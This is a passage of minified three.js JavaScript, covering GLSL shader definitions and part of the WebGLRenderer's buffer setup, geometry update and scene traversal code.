vec4( diffuse, opacity );",THREE.ShaderChunk.logdepthbuf_fragment,THREE.ShaderChunk.color_fragment,"	outgoingLight = diffuseColor.rgb;",THREE.ShaderChunk.fog_fragment,"	gl_FragColor = vec4( outgoingLight, diffuseColor.a );","}"].join("\n")},depth:{uniforms:{mNear:{type:"f",value:1},mFar:{type:"f",value:2e3},opacity:{type:"f",value:1}},vertexShader:[THREE.ShaderChunk.common,THREE.ShaderChunk.morphtarget_pars_vertex,THREE.ShaderChunk.logdepthbuf_pars_vertex,"void main() {",THREE.ShaderChunk.morphtarget_vertex,THREE.ShaderChunk.default_vertex,THREE.ShaderChunk.logdepthbuf_vertex,"}"].join("\n"),fragmentShader:["uniform float mNear;","uniform float mFar;","uniform float opacity;",THREE.ShaderChunk.common,THREE.ShaderChunk.logdepthbuf_pars_fragment,"void main() {",THREE.ShaderChunk.logdepthbuf_fragment,"	#ifdef USE_LOGDEPTHBUF_EXT","		float depth = gl_FragDepthEXT / gl_FragCoord.w;","	#else","		float depth = gl_FragCoord.z / gl_FragCoord.w;","	#endif","	float color = 1.0 - smoothstep( mNear, mFar, depth );","	gl_FragColor = vec4( vec3( color ), opacity );","}"].join("\n")},normal:{uniforms:{opacity:{type:"f",value:1}},vertexShader:["varying vec3 vNormal;",THREE.ShaderChunk.common,THREE.ShaderChunk.morphtarget_pars_vertex,THREE.ShaderChunk.logdepthbuf_pars_vertex,"void main() {","	vNormal = normalize( normalMatrix * normal );",THREE.ShaderChunk.morphtarget_vertex,THREE.ShaderChunk.default_vertex,THREE.ShaderChunk.logdepthbuf_vertex,"}"].join("\n"),fragmentShader:["uniform float opacity;","varying vec3 vNormal;",THREE.ShaderChunk.common,THREE.ShaderChunk.logdepthbuf_pars_fragment,"void main() {","	gl_FragColor = vec4( 0.5 * normalize( vNormal ) + 0.5, opacity );",THREE.ShaderChunk.logdepthbuf_fragment,"}"].join("\n")},cube:{uniforms:{tCube:{type:"t",value:null},tFlip:{type:"f",value:-1}},vertexShader:["varying vec3 vWorldPosition;",THREE.ShaderChunk.common,THREE.ShaderChunk.logdepthbuf_pars_vertex,"void main() {","	vWorldPosition = transformDirection( position, modelMatrix );","	gl_Position = projectionMatrix * modelViewMatrix * vec4( position, 1.0 );",THREE.ShaderChunk.logdepthbuf_vertex,"}"].join("\n"),fragmentShader:["uniform samplerCube tCube;","uniform float tFlip;","varying vec3 vWorldPosition;",THREE.ShaderChunk.common,THREE.ShaderChunk.logdepthbuf_pars_fragment,"void main() {","	gl_FragColor = textureCube( tCube, vec3( tFlip * vWorldPosition.x, vWorldPosition.yz ) );",THREE.ShaderChunk.logdepthbuf_fragment,"}"].join("\n")},equirect:{uniforms:{tEquirect:{type:"t",value:null},tFlip:{type:"f",value:-1}},vertexShader:["varying vec3 vWorldPosition;",THREE.ShaderChunk.common,THREE.ShaderChunk.logdepthbuf_pars_vertex,"void main() {","	vWorldPosition = transformDirection( position, modelMatrix );","	gl_Position = projectionMatrix * modelViewMatrix * vec4( position, 1.0 );",THREE.ShaderChunk.logdepthbuf_vertex,"}"].join("\n"),fragmentShader:["uniform sampler2D tEquirect;","uniform float tFlip;","varying vec3 vWorldPosition;",THREE.ShaderChunk.common,THREE.ShaderChunk.logdepthbuf_pars_fragment,"void main() {","vec3 direction = normalize( vWorldPosition );","vec2 sampleUV;","sampleUV.y = saturate( tFlip * direction.y * -0.5 + 0.5 );","sampleUV.x = atan( direction.z, direction.x ) * RECIPROCAL_PI2 + 0.5;","gl_FragColor = texture2D( tEquirect, sampleUV );",THREE.ShaderChunk.logdepthbuf_fragment,"}"].join("\n")},depthRGBA:{uniforms:{},vertexShader:[THREE.ShaderChunk.common,THREE.ShaderChunk.morphtarget_pars_vertex,THREE.ShaderChunk.skinning_pars_vertex,THREE.ShaderChunk.logdepthbuf_pars_vertex,"void main() {",THREE.ShaderChunk.skinbase_vertex,THREE.ShaderChunk.morphtarget_vertex,THREE.ShaderChunk.skinning_vertex,THREE.ShaderChunk.default_vertex,THREE.ShaderChunk.logdepthbuf_vertex,"}"].join("\n"),fragmentShader:[THREE.ShaderChunk.common,THREE.ShaderChunk.logdepthbuf_pars_fragment,"vec4 pack_depth( const in float depth ) {","	const vec4 bit_shift = vec4( 256.0 * 256.0 * 256.0, 256.0 * 256.0, 256.0, 1.0 );","	const vec4 bit_mask = vec4( 0.0, 1.0 / 256.0, 1.0 / 256.0, 1.0 / 256.0 );","	vec4 res = mod( depth * bit_shift * vec4( 255 ), vec4( 256 ) ) / vec4( 255 );","	res -= res.xxyz * bit_mask;","	return res;","}","void main() {",THREE.ShaderChunk.logdepthbuf_fragment,"	#ifdef USE_LOGDEPTHBUF_EXT","		gl_FragData[ 0 ] = pack_depth( gl_FragDepthEXT );","	#else","		gl_FragData[ 0 ] = pack_depth( gl_FragCoord.z );","	#endif","}"].join("\n")}},THREE.WebGLRenderer=function(e){function t(e){e.__webglVertexBuffer=Ce.createBuffer(),e.__webglColorBuffer=Ce.createBuffer(),Le.info.memory.geometries++}function r(e){e.__webglVertexBuffer=Ce.createBuffer(),e.__webglColorBuffer=Ce.createBuffer(),e.__webglLineDistanceBuffer=Ce.createBuffer(),Le.info.memory.geometries++}function i(e){e.__webglVertexBuffer=Ce.createBuffer(),e.__webglNormalBuffer=Ce.createBuffer(),e.__webglTangentBuffer=Ce.createBuffer(),e.__webglColorBuffer=Ce.createBuffer(),e.__webglUVBuffer=Ce.createBuffer(),e.__webglUV2Buffer=Ce.createBuffer(),e.__webglSkinIndicesBuffer=Ce.createBuffer(),e.__webglSkinWeightsBuffer=Ce.createBuffer(),e.__webglFaceBuffer=Ce.createBuffer(),e.__webglLineBuffer=Ce.createBuffer();var t=e.numMorphTargets;if(t){e.__webglMorphTargetsBuffers=[];for(var r=0,i=t;i>r;r++)e.__webglMorphTargetsBuffers.push(Ce.createBuffer())}var n=e.numMorphNormals;if(n){e.__webglMorphNormalsBuffers=[];for(var r=0,i=n;i>r;r++)e.__webglMorphNormalsBuffers.push(Ce.createBuffer())}Le.info.memory.geometries++}function n(e){var t=e.geometry,r=e.material,i=t.vertices.length;if(r.attributes){void 0===t.__webglCustomAttributesList&&(t.__webglCustomAttributesList=[]);for(var n in r.attributes){var a=r.attributes[n];if(!a.__webglInitialized||a.createUniqueBuffers){a.__webglInitialized=!0;var o=1;"v2"===a.type?o=2:"v3"===a.type?o=3:"v4"===a.type?o=4:"c"===a.type&&(o=3),a.size=o,a.array=new Float32Array(i*o),a.buffer=Ce.createBuffer(),a.buffer.belongsToAttribute=n,a.needsUpdate=!0}t.__webglCustomAttributesList.push(a)}}}function a(e,t){var r=e.vertices.length;e.__vertexArray=new Float32Array(3*r),e.__colorArray=new Float32Array(3*r),e.__webglParticleCount=r,n(t)}function o(e,t){var r=e.vertices.length;e.__vertexArray=new Float32Array(3*r),e.__colorArray=new Float32Array(3*r),e.__lineDistanceArray=new Float32Array(1*r),e.__webglLineCount=r,n(t)}function s(e,t){var r=t.geometry,i=e.faces3,n=3*i.length,a=1*i.length,o=3*i.length,s=h(t,e);e.__vertexArray=new Float32Array(3*n),e.__normalArray=new Float32Array(3*n),e.__colorArray=new Float32Array(3*n),e.__uvArray=new Float32Array(2*n),r.faceVertexUvs.length>1&&(e.__uv2Array=new Float32Array(2*n)),r.hasTangents&&(e.__tangentArray=new Float32Array(4*n)),t.geometry.skinWeights.length&&t.geometry.skinIndices.length&&(e.__skinIndexArray=new Float32Array(4*n),e.__skinWeightArray=new Float32Array(4*n));var l=null!==et.get("OES_element_index_uint")&&a>21845?Uint32Array:Uint16Array;e.__typeArray=l,e.__faceArray=new l(3*a),e.__lineArray=new l(2*o);var c=e.numMorphTargets;if(c){e.__morphTargetsArrays=[];for(var u=0,E=c;E>u;u++)e.__morphTargetsArrays.push(new Float32Array(3*n))}var f=e.numMorphNormals;if(f){e.__morphNormalsArrays=[];for(var u=0,E=f;E>u;u++)e.__morphNormalsArrays.push(new Float32Array(3*n))}if(e.__webglFaceCount=3*a,e.__webglLineCount=2*o,s.attributes){void 0===e.__webglCustomAttributesList&&(e.__webglCustomAttributesList=[]);for(var p in s.attributes){var d=s.attributes[p],m={};for(var T in d)m[T]=d[T];if(!m.__webglInitialized||m.createUniqueBuffers){m.__webglInitialized=!0;var g=1;"v2"===m.type?g=2:"v3"===m.type?g=3:"v4"===m.type?g=4:"c"===m.type&&(g=3),m.size=g,m.array=new Float32Array(n*g),m.buffer=Ce.createBuffer(),m.buffer.belongsToAttribute=p,d.needsUpdate=!0,m.__original=d}e.__webglCustomAttributesList.push(m)}}e.__inittedArrays=!0}function h(e,t){return e.material instanceof THREE.MeshFaceMaterial?e.material.materials[t.materialIndex]:e.material}function l(e){return e instanceof THREE.MeshPhongMaterial==!1&&e.shading===THREE.FlatShading}function c(e,t,r){var i,n,a,o,s,h,l,c,u,E,f,p=e.vertices,d=p.length,m=e.colors,T=m.length,g=e.__vertexArray,v=e.__colorArray,R=e.verticesNeedUpdate,y=e.colorsNeedUpdate,H=e.__webglCustomAttributesList;if(R){for(i=0;d>i;i++)a=p[i],o=3*i,g[o]=a.x,g[o+1]=a.y,g[o+2]=a.z;Ce.bindBuffer(Ce.ARRAY_BUFFER,e.__webglVertexBuffer),Ce.bufferData(Ce.ARRAY_BUFFER,g,t)}if(y){for(n=0;T>n;n++)s=m[n],o=3*n,v[o]=s.r,v[o+1]=s.g,v[o+2]=s.b;Ce.bindBuffer(Ce.ARRAY_BUFFER,e.__webglColorBuffer),Ce.bufferData(Ce.ARRAY_BUFFER,v,t)}if(H)for(h=0,l=H.length;l>h;h++){if(f=H[h],f.needsUpdate&&(void 0===f.boundTo||"vertices"===f.boundTo))if(u=f.value.length,o=0,1===f.size)for(c=0;u>c;c++)f.array[c]=f.value[c];else if(2===f.size)for(c=0;u>c;c++)E=f.value[c],f.array[o]=E.x,f.array[o+1]=E.y,o+=2;else if(3===f.size)if("c"===f.type)for(c=0;u>c;c++)E=f.value[c],f.array[o]=E.r,f.array[o+1]=E.g,f.array[o+2]=E.b,o+=3;else for(c=0;u>c;c++)E=f.value[c],f.array[o]=E.x,f.array[o+1]=E.y,f.array[o+2]=E.z,o+=3;else if(4===f.size)for(c=0;u>c;c++)E=f.value[c],f.array[o]=E.x,f.array[o+1]=E.y,f.array[o+2]=E.z,f.array[o+3]=E.w,o+=4;Ce.bindBuffer(Ce.ARRAY_BUFFER,f.buffer),Ce.bufferData(Ce.ARRAY_BUFFER,f.array,t),f.needsUpdate=!1}}function u(e,t){var r,i,n,a,o,s,h,l,c,u,E,f,p=e.vertices,d=e.colors,m=e.lineDistances,T=p.length,g=d.length,v=m.length,R=e.__vertexArray,y=e.__colorArray,H=e.__lineDistanceArray,x=e.verticesNeedUpdate,b=e.colorsNeedUpdate,_=e.lineDistancesNeedUpdate,w=e.__webglCustomAttributesList;if(x){for(r=0;T>r;r++)a=p[r],o=3*r,R[o]=a.x,R[o+1]=a.y,R[o+2]=a.z;Ce.bindBuffer(Ce.ARRAY_BUFFER,e.__webglVertexBuffer),Ce.bufferData(Ce.ARRAY_BUFFER,R,t)}if(b){for(i=0;g>i;i++)s=d[i],o=3*i,y[o]=s.r,y[o+1]=s.g,y[o+2]=s.b;Ce.bindBuffer(Ce.ARRAY_BUFFER,e.__webglColorBuffer),Ce.bufferData(Ce.ARRAY_BUFFER,y,t)}if(_){for(n=0;v>n;n++)H[n]=m[n];Ce.bindBuffer(Ce.ARRAY_BUFFER,e.__webglLineDistanceBuffer),Ce.bufferData(Ce.ARRAY_BUFFER,H,t)}if(w)for(h=0,l=w.length;l>h;h++)if(f=w[h],f.needsUpdate&&(void 0===f.boundTo||"vertices"===f.boundTo)){if(o=0,u=f.value.length,1===f.size)for(c=0;u>c;c++)f.array[c]=f.value[c];else if(2===f.size)for(c=0;u>c;c++)E=f.value[c],f.array[o]=E.x,f.array[o+1]=E.y,o+=2;else if(3===f.size)if("c"===f.type)for(c=0;u>c;c++)E=f.value[c],f.array[o]=E.r,f.array[o+1]=E.g,f.array[o+2]=E.b,o+=3;else for(c=0;u>c;c++)E=f.value[c],f.array[o]=E.x,f.array[o+1]=E.y,f.array[o+2]=E.z,o+=3;else if(4===f.size)for(c=0;u>c;c++)E=f.value[c],f.array[o]=E.x,f.array[o+1]=E.y,f.array[o+2]=E.z,f.array[o+3]=E.w,o+=4;Ce.bindBuffer(Ce.ARRAY_BUFFER,f.buffer),Ce.bufferData(Ce.ARRAY_BUFFER,f.array,t),f.needsUpdate=!1}}function E(e,t,r,i,n){if(e.__inittedArrays){var a,o,s,h,c,u,E,f,p,d,m,T,g,v,R,y,H,x,b,_,w,M,S,A,C,L,P,F,U,B,D,V,z,k,N,O,G,I,W,j,X,q,Y=l(n),K=0,Q=0,Z=0,J=0,$=0,ee=0,te=0,re=0,ie=0,ne=0,ae=0,oe=0,se=e.__vertexArray,he=e.__uvArray,le=e.__uv2Array,ce=e.__normalArray,ue=e.__tangentArray,Ee=e.__colorArray,fe=e.__skinIndexArray,pe=e.__skinWeightArray,de=e.__morphTargetsArrays,me=e.__morphNormalsArrays,Te=e.__webglCustomAttributesList,ge=e.__faceArray,ve=e.__lineArray,Re=t.geometry,ye=Re.verticesNeedUpdate,He=Re.elementsNeedUpdate,xe=Re.uvsNeedUpdate,be=Re.normalsNeedUpdate,_e=Re.tangentsNeedUpdate,we=Re.colorsNeedUpdate,Me=Re.morphTargetsNeedUpdate,Se=Re.vertices,Ae=e.faces3,Le=Re.faces,Pe=Re.faceVertexUvs[0],Fe=Re.faceVertexUvs[1],Ue=Re.skinIndices,Be=Re.skinWeights,De=Re.morphTargets,Ve=Re.morphNormals;if(ye){for(a=0,o=Ae.length;o>a;a++)h=Le[Ae[a]],T=Se[h.a],g=Se[h.b],v=Se[h.c],se[Q]=T.x,se[Q+1]=T.y,se[Q+2]=T.z,se[Q+3]=g.x,se[Q+4]=g.y,se[Q+5]=g.z,se[Q+6]=v.x,se[Q+7]=v.y,se[Q+8]=v.z,Q+=9;Ce.bindBuffer(Ce.ARRAY_BUFFER,e.__webglVertexBuffer),Ce.bufferData(Ce.ARRAY_BUFFER,se,r)}if(Me)for(N=0,O=De.length;O>N;N++){for(ae=0,a=0,o=Ae.length;o>a;a++)W=Ae[a],h=Le[W],T=De[N].vertices[h.a],g=De[N].vertices[h.b],v=De[N].vertices[h.c],G=de[N],G[ae]=T.x,G[ae+1]=T.y,G[ae+2]=T.z,G[ae+3]=g.x,G[ae+4]=g.y,G[ae+5]=g.z,G[ae+6]=v.x,G[ae+7]=v.y,G[ae+8]=v.z,n.morphNormals&&(Y?(x=Ve[N].faceNormals[W],b=x,_=x):(j=Ve[N].vertexNormals[W],x=j.a,b=j.b,_=j.c),I=me[N],I[ae]=x.x,I[ae+1]=x.y,I[ae+2]=x.z,I[ae+3]=b.x,I[ae+4]=b.y,I[ae+5]=b.z,I[ae+6]=_.x,I[ae+7]=_.y,I[ae+8]=_.z),ae+=9;Ce.bindBuffer(Ce.ARRAY_BUFFER,e.__webglMorphTargetsBuffers[N]),Ce.bufferData(Ce.ARRAY_BUFFER,de[N],r),n.morphNormals&&(Ce.bindBuffer(Ce.ARRAY_BUFFER,e.__webglMorphNormalsBuffers[N]),Ce.bufferData(Ce.ARRAY_BUFFER,me[N],r))}if(Be.length){for(a=0,o=Ae.length;o>a;a++)h=Le[Ae[a]],A=Be[h.a],C=Be[h.b],L=Be[h.c],pe[ne]=A.x,pe[ne+1]=A.y,pe[ne+2]=A.z,pe[ne+3]=A.w,pe[ne+4]=C.x,pe[ne+5]=C.y,pe[ne+6]=C.z,pe[ne+7]=C.w,pe[ne+8]=L.x,pe[ne+9]=L.y,pe[ne+10]=L.z,pe[ne+11]=L.w,P=Ue[h.a],F=Ue[h.b],U=Ue[h.c],fe[ne]=P.x,fe[ne+1]=P.y,fe[ne+2]=P.z,fe[ne+3]=P.w,fe[ne+4]=F.x,fe[ne+5]=F.y,fe[ne+6]=F.z,fe[ne+7]=F.w,fe[ne+8]=U.x,fe[ne+9]=U.y,fe[ne+10]=U.z,fe[ne+11]=U.w,ne+=12;ne>0&&(Ce.bindBuffer(Ce.ARRAY_BUFFER,e.__webglSkinIndicesBuffer),Ce.bufferData(Ce.ARRAY_BUFFER,fe,r),Ce.bindBuffer(Ce.ARRAY_BUFFER,e.__webglSkinWeightsBuffer),Ce.bufferData(Ce.ARRAY_BUFFER,pe,r))}if(we){for(a=0,o=Ae.length;o>a;a++)h=Le[Ae[a]],E=h.vertexColors,f=h.color,3===E.length&&n.vertexColors===THREE.VertexColors?(w=E[0],M=E[1],S=E[2]):(w=f,M=f,S=f),Ee[ie]=w.r,Ee[ie+1]=w.g,Ee[ie+2]=w.b,Ee[ie+3]=M.r,Ee[ie+4]=M.g,Ee[ie+5]=M.b,Ee[ie+6]=S.r,Ee[ie+7]=S.g,Ee[ie+8]=S.b,ie+=9;ie>0&&(Ce.bindBuffer(Ce.ARRAY_BUFFER,e.__webglColorBuffer),Ce.bufferData(Ce.ARRAY_BUFFER,Ee,r))}if(_e&&Re.hasTangents){for(a=0,o=Ae.length;o>a;a++)h=Le[Ae[a]],p=h.vertexTangents,R=p[0],y=p[1],H=p[2],ue[te]=R.x,ue[te+1]=R.y,ue[te+2]=R.z,ue[te+3]=R.w,ue[te+4]=y.x,ue[te+5]=y.y,ue[te+6]=y.z,ue[te+7]=y.w,ue[te+8]=H.x,ue[te+9]=H.y,ue[te+10]=H.z,ue[te+11]=H.w,te+=12;Ce.bindBuffer(Ce.ARRAY_BUFFER,e.__webglTangentBuffer),Ce.bufferData(Ce.ARRAY_BUFFER,ue,r)}if(be){for(a=0,o=Ae.length;o>a;a++)if(h=Le[Ae[a]],c=h.vertexNormals,u=h.normal,3===c.length&&Y===!1)for(B=0;3>B;B++)V=c[B],ce[ee]=V.x,ce[ee+1]=V.y,ce[ee+2]=V.z,ee+=3;else for(B=0;3>B;B++)ce[ee]=u.x,ce[ee+1]=u.y,ce[ee+2]=u.z,ee+=3;Ce.bindBuffer(Ce.ARRAY_BUFFER,e.__webglNormalBuffer),Ce.bufferData(Ce.ARRAY_BUFFER,ce,r)}if(xe&&Pe){for(a=0,o=Ae.length;o>a;a++)if(s=Ae[a],d=Pe[s],void 0!==d)for(B=0;3>B;B++)z=d[B],he[Z]=z.x,he[Z+1]=z.y,Z+=2;Z>0&&(Ce.bindBuffer(Ce.ARRAY_BUFFER,e.__webglUVBuffer),Ce.bufferData(Ce.ARRAY_BUFFER,he,r))}if(xe&&Fe){for(a=0,o=Ae.length;o>a;a++)if(s=Ae[a],m=Fe[s],void 0!==m)for(B=0;3>B;B++)k=m[B],le[J]=k.x,le[J+1]=k.y,J+=2;J>0&&(Ce.bindBuffer(Ce.ARRAY_BUFFER,e.__webglUV2Buffer),Ce.bufferData(Ce.ARRAY_BUFFER,le,r))}if(He){for(a=0,o=Ae.length;o>a;a++)ge[$]=K,ge[$+1]=K+1,ge[$+2]=K+2,$+=3,ve[re]=K,ve[re+1]=K+1,ve[re+2]=K,ve[re+3]=K+2,ve[re+4]=K+1,ve[re+5]=K+2,re+=6,K+=3;Ce.bindBuffer(Ce.ELEMENT_ARRAY_BUFFER,e.__webglFaceBuffer),Ce.bufferData(Ce.ELEMENT_ARRAY_BUFFER,ge,r),Ce.bindBuffer(Ce.ELEMENT_ARRAY_BUFFER,e.__webglLineBuffer),Ce.bufferData(Ce.ELEMENT_ARRAY_BUFFER,ve,r)}if(Te)for(B=0,D=Te.length;D>B;B++)if(q=Te[B],q.__original.needsUpdate){if(oe=0,1===q.size){if(void 0===q.boundTo||"vertices"===q.boundTo)for(a=0,o=Ae.length;o>a;a++)h=Le[Ae[a]],q.array[oe]=q.value[h.a],q.array[oe+1]=q.value[h.b],q.array[oe+2]=q.value[h.c],oe+=3;else if("faces"===q.boundTo)for(a=0,o=Ae.length;o>a;a++)X=q.value[Ae[a]],q.array[oe]=X,q.array[oe+1]=X,q.array[oe+2]=X,oe+=3}else if(2===q.size){if(void 0===q.boundTo||"vertices"===q.boundTo)for(a=0,o=Ae.length;o>a;a++)h=Le[Ae[a]],T=q.value[h.a],g=q.value[h.b],v=q.value[h.c],q.array[oe]=T.x,q.array[oe+1]=T.y,q.array[oe+2]=g.x,q.array[oe+3]=g.y,q.array[oe+4]=v.x,q.array[oe+5]=v.y,oe+=6;else if("faces"===q.boundTo)for(a=0,o=Ae.length;o>a;a++)X=q.value[Ae[a]],T=X,g=X,v=X,q.array[oe]=T.x,q.array[oe+1]=T.y,q.array[oe+2]=g.x,q.array[oe+3]=g.y,q.array[oe+4]=v.x,q.array[oe+5]=v.y,oe+=6}else if(3===q.size){var ze;if(ze="c"===q.type?["r","g","b"]:["x","y","z"],void 0===q.boundTo||"vertices"===q.boundTo)for(a=0,o=Ae.length;o>a;a++)h=Le[Ae[a]],T=q.value[h.a],g=q.value[h.b],v=q.value[h.c],q.array[oe]=T[ze[0]],q.array[oe+1]=T[ze[1]],q.array[oe+2]=T[ze[2]],q.array[oe+3]=g[ze[0]],q.array[oe+4]=g[ze[1]],q.array[oe+5]=g[ze[2]],q.array[oe+6]=v[ze[0]],q.array[oe+7]=v[ze[1]],q.array[oe+8]=v[ze[2]],oe+=9;else if("faces"===q.boundTo)for(a=0,o=Ae.length;o>a;a++)X=q.value[Ae[a]],T=X,g=X,v=X,q.array[oe]=T[ze[0]],q.array[oe+1]=T[ze[1]],q.array[oe+2]=T[ze[2]],q.array[oe+3]=g[ze[0]],q.array[oe+4]=g[ze[1]],q.array[oe+5]=g[ze[2]],q.array[oe+6]=v[ze[0]],q.array[oe+7]=v[ze[1]],q.array[oe+8]=v[ze[2]],oe+=9;else if("faceVertices"===q.boundTo)for(a=0,o=Ae.length;o>a;a++)X=q.value[Ae[a]],T=X[0],g=X[1],v=X[2],q.array[oe]=T[ze[0]],q.array[oe+1]=T[ze[1]],q.array[oe+2]=T[ze[2]],q.array[oe+3]=g[ze[0]],q.array[oe+4]=g[ze[1]],q.array[oe+5]=g[ze[2]],q.array[oe+6]=v[ze[0]],q.array[oe+7]=v[ze[1]],q.array[oe+8]=v[ze[2]],oe+=9}else if(4===q.size)if(void 0===q.boundTo||"vertices"===q.boundTo)for(a=0,o=Ae.length;o>a;a++)h=Le[Ae[a]],T=q.value[h.a],g=q.value[h.b],v=q.value[h.c],q.array[oe]=T.x,q.array[oe+1]=T.y,q.array[oe+2]=T.z,q.array[oe+3]=T.w,q.array[oe+4]=g.x,q.array[oe+5]=g.y,q.array[oe+6]=g.z,q.array[oe+7]=g.w,q.array[oe+8]=v.x,q.array[oe+9]=v.y,q.array[oe+10]=v.z,q.array[oe+11]=v.w,oe+=12;else if("faces"===q.boundTo)for(a=0,o=Ae.length;o>a;a++)X=q.value[Ae[a]],T=X,g=X,v=X,q.array[oe]=T.x,q.array[oe+1]=T.y,q.array[oe+2]=T.z,q.array[oe+3]=T.w,q.array[oe+4]=g.x,q.array[oe+5]=g.y,q.array[oe+6]=g.z,q.array[oe+7]=g.w,q.array[oe+8]=v.x,q.array[oe+9]=v.y,q.array[oe+10]=v.z,q.array[oe+11]=v.w,oe+=12;else if("faceVertices"===q.boundTo)for(a=0,o=Ae.length;o>a;a++)X=q.value[Ae[a]],T=X[0],g=X[1],v=X[2],q.array[oe]=T.x,q.array[oe+1]=T.y,q.array[oe+2]=T.z,q.array[oe+3]=T.w,q.array[oe+4]=g.x,q.array[oe+5]=g.y,q.array[oe+6]=g.z,q.array[oe+7]=g.w,q.array[oe+8]=v.x,q.array[oe+9]=v.y,q.array[oe+10]=v.z,q.array[oe+11]=v.w,oe+=12;Ce.bindBuffer(Ce.ARRAY_BUFFER,q.buffer),Ce.bufferData(Ce.ARRAY_BUFFER,q.array,r)}i&&(delete e.__inittedArrays,delete e.__colorArray,delete e.__normalArray,delete e.__tangentArray,delete e.__uvArray,delete e.__uv2Array,delete e.__faceArray,delete e.__vertexArray,delete e.__lineArray,delete e.__skinIndexArray,delete e.__skinWeightArray)}}function f(e,t,r,i){for(var n=r.attributes,a=t.attributes,o=t.attributesKeys,s=0,h=o.length;h>s;s++){var l=o[s],c=a[l];if(c>=0){var u=n[l];if(void 0!==u){var E=u.itemSize;Ce.bindBuffer(Ce.ARRAY_BUFFER,u.buffer),$e.enableAttribute(c),Ce.vertexAttribPointer(c,E,Ce.FLOAT,!1,0,i*E*4)}else void 0!==e.defaultAttributeValues&&(2===e.defaultAttributeValues[l].length?Ce.vertexAttrib2fv(c,e.defaultAttributeValues[l]):3===e.defaultAttributeValues[l].length&&Ce.vertexAttrib3fv(c,e.defaultAttributeValues[l]))}}$e.disableUnusedAttributes()}function p(e,t,r){var i=e.program.attributes;if(-1!==r.morphTargetBase&&i.position>=0?(Ce.bindBuffer(Ce.ARRAY_BUFFER,t.__webglMorphTargetsBuffers[r.morphTargetBase]),$e.enableAttribute(i.position),Ce.vertexAttribPointer(i.position,3,Ce.FLOAT,!1,0,0)):i.position>=0&&(Ce.bindBuffer(Ce.ARRAY_BUFFER,t.__webglVertexBuffer),$e.enableAttribute(i.position),Ce.vertexAttribPointer(i.position,3,Ce.FLOAT,!1,0,0)),r.morphTargetForcedOrder.length)for(var n,a=0,o=r.morphTargetForcedOrder,s=r.morphTargetInfluences;a<e.numSupportedMorphTargets&&a<o.length;)n=i["morphTarget"+a],n>=0&&(Ce.bindBuffer(Ce.ARRAY_BUFFER,t.__webglMorphTargetsBuffers[o[a]]),$e.enableAttribute(n),Ce.vertexAttribPointer(n,3,Ce.FLOAT,!1,0,0)),n=i["morphNormal"+a],n>=0&&e.morphNormals&&(Ce.bindBuffer(Ce.ARRAY_BUFFER,t.__webglMorphNormalsBuffers[o[a]]),$e.enableAttribute(n),Ce.vertexAttribPointer(n,3,Ce.FLOAT,!1,0,0)),r.__webglMorphTargetInfluences[a]=s[o[a]],a++;else{var h=[],s=r.morphTargetInfluences,l=r.geometry.morphTargets;s.length>l.length&&(console.warn("THREE.WebGLRenderer: Influences array is bigger than morphTargets array."),s.length=l.length);for(var c=0,u=s.length;u>c;c++){var E=s[c];h.push([E,c])}h.length>e.numSupportedMorphTargets?(h.sort(T),h.length=e.numSupportedMorphTargets):h.length>e.numSupportedMorphNormals?h.sort(T):0===h.length&&h.push([0,0]);for(var n,a=0,f=e.numSupportedMorphTargets;f>a;a++)if(h[a]){var p=h[a][1];n=i["morphTarget"+a],n>=0&&(Ce.bindBuffer(Ce.ARRAY_BUFFER,t.__webglMorphTargetsBuffers[p]),$e.enableAttribute(n),Ce.vertexAttribPointer(n,3,Ce.FLOAT,!1,0,0)),n=i["morphNormal"+a],n>=0&&e.morphNormals&&(Ce.bindBuffer(Ce.ARRAY_BUFFER,t.__webglMorphNormalsBuffers[p]),$e.enableAttribute(n),Ce.vertexAttribPointer(n,3,Ce.FLOAT,!1,0,0)),r.__webglMorphTargetInfluences[a]=s[p]}else r.__webglMorphTargetInfluences[a]=0}null!==e.program.uniforms.morphTargetInfluences&&Ce.uniform1fv(e.program.uniforms.morphTargetInfluences,r.__webglMorphTargetInfluences)}function d(e,t){return e.object.renderOrder!==t.object.renderOrder?e.object.renderOrder-t.object.renderOrder:e.material.id!==t.material.id?e.material.id-t.material.id:e.z!==t.z?e.z-t.z:e.id-t.id}function m(e,t){return e.object.renderOrder!==t.object.renderOrder?e.object.renderOrder-t.object.renderOrder:e.z!==t.z?t.z-e.z:e.id-t.id}function T(e,t){return t[0]-e[0]}function g(e){if(e.visible!==!1){if(e instanceof THREE.Scene||e instanceof THREE.Group);else if(x(e),e instanceof THREE.Light)xe.push(e);else if(e instanceof THREE.Sprite)Se.push(e);else if(e instanceof THREE.LensFlare)Ae.push(e);else{var t=be[e.id];if(t&&(e.frustumCulled===!1||je.intersectsObject(e)===!0))for(var r=0,i=t.length;i>r;r++){var n=t[r];H(n),n.render=!0,Le.sortObjects===!0&&(qe.setFromMatrixPosition(e.matrixWorld),qe.applyProjection(Xe),n.z=qe.z)}}for(var r=0,i=e.children.length;i>r;r++)g(e.children[r])}}function v(e,t,r,i,n){for(var a,o=0,s=e.length;s>o;o++){var h=e[o],l=h.object,c=h.buffer;if(K(l,t),n)a=n;else{if(a=h.material,!a)continue;U(a)}Le.setMaterialFaces(a),c instanceof THREE.BufferGeometry?Le.renderBufferDirect(t,r,i,a,c,l):Le.renderBuffer(t,r,i,a,c,l)}}function R(e,t,r,i,n,a){for(var o,s=0,h=e.length;h>s;s++){var l=e[s],c=l.object;if(c.visible){if(a)o=a;else{if(o=l[t],!o)continue;U(o)}Le.renderImmediateObject(r,i,n,o,c)}}}function y(e){var t=e.object,r=t.material;r.transparent?(e.transparent=r,e.opaque=null):(e.opaque=r,e.transparent=null)}function H(e){var t=e.object,r=e.buffer,i=t.geometry,n=t.material;if(n instanceof THREE.MeshFaceMaterial){var a=i instanceof THREE.BufferGeometry?0:r.materialIndex;n=n.materials[a],e.material=n,n.transparent?Me.push(e):we.push(e)}else n&&(e.material=n,n.transparent?Me.push(e):we.push(e))}function x(e){void 0===e.__webglInit&&(e.__webglInit=!0,e._modelViewMatrix=new THREE.Matrix4,e._normalMatrix=new THREE.Matrix3,e.addEventListener("removed",Rt));var i=e.geometry;if(void 0===i||void 0===i.__webglInit&&(i.__webglInit=!0,i.addEventListener("dispose",yt),i instanceof THREE.BufferGeometry?Le.info.memory.geometries++:e instanceof THREE.Mesh?_(e,i):e instanceof THREE.Line?void 0===i.__webglVertexBuffer&&(r(i),o(i,e),i.verticesNeedUpdate=!0,i.colorsNeedUpdate=!0,i.lineDistancesNeedUpdate=!0):e instanceof THREE.PointCloud&&void 0===i.__webglVertexBuffer&&(t(i),a(i,e),i.verticesNeedUpdate=!0,i.colorsNeedUpdate=!0)),void 